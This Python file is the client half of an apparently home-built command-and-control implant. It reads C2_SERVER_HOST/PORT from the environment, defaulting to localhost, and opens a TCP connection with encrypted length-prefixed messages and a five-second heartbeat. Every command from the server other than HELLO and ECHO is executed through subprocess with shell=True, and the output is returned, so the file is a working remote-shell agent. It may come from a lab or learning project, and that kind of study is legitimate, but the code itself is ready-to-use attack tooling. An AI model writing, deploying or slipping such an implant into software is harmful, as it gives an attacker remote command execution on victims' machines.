import socket
import threading
import time
import sys
import subprocess
import queue
import os
from dotenv import load_dotenv

from crypto_utils import encrypt_message, decrypt_message

load_dotenv()

SERVER_HOST = os.getenv("C2_SERVER_HOST", "127.0.0.1")
SERVER_PORT = int(os.getenv("C2_SERVER_PORT", "9000"))

command_queue = queue.Queue()


# -----------------------------
# Message Protocol
# -----------------------------
def send_msg(sock, obj):
    """Encrypt and send a dict to the server"""
    cipher = encrypt_message(obj)
    sock.sendall(len(cipher).to_bytes(4, "big") + cipher)


def recv_msg(conn):
    """Receive encrypted dict from server"""
    hdr = conn.recv(4)
    if not hdr:
        return None
    length = int.from_bytes(hdr, "big")
    cipher = b""
    while len(cipher) < length:
        chunk = conn.recv(length - len(cipher))
        if not chunk:
            return None
        cipher += chunk
    try:
        return decrypt_message(cipher)
    except Exception as e:
        print("Decrypt error:", e)
        return None


# -----------------------------
# Command Processor
# -----------------------------
def process_command(sock, cmd):
    cmd = cmd.strip()

    if cmd.upper() == "HELLO":
        result = "Hello World from client"
    elif cmd.upper().startswith("ECHO "):
        result = cmd[5:]
    else:
        try:
            result = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT, timeout=15
            ).decode(errors="ignore")
        except subprocess.TimeoutExpired:
            result = "Command timed out"
        except Exception as e:
            result = f"Error: {e}"

    send_msg(sock, {"type": "response", "result": result})


# -----------------------------
# Queue Runner Thread
# -----------------------------
def command_runner(sock):
    while True:
        cmd = command_queue.get()
        if cmd is None:
            break
        process_command(sock, cmd)


# -----------------------------
# Receive Loop
# -----------------------------
def recv_loop(sock):
    while True:
        try:
            msg = recv_msg(sock)
            if msg is None:
                break

            if msg.get("type") == "command":
                command_queue.put(msg.get("cmd", ""))

        except Exception as e:
            print("Receive error:", e)
            break

    print("Server disconnected.")
    sock.close()


# -----------------------------
# Heartbeat Thread
# -----------------------------
def heartbeat(sock):
    while True:
        try:
            send_msg(sock, {"type": "heartbeat"})
        except Exception as e:
            print("Heartbeat error:", e)
            break
        time.sleep(5)


# -----------------------------
# Main
# -----------------------------
def main():
    host = SERVER_HOST
    port = SERVER_PORT

    if len(sys.argv) >= 3:
        host = sys.argv[1]
        port = int(sys.argv[2])

    print(f"Connecting to {host}:{port}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    threading.Thread(target=recv_loop, args=(sock,), daemon=True).start()
    threading.Thread(target=heartbeat, args=(sock,), daemon=True).start()
    threading.Thread(target=command_runner, args=(sock,), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Client exiting...")
        sock.close()


if __name__ == "__main__":
    main()
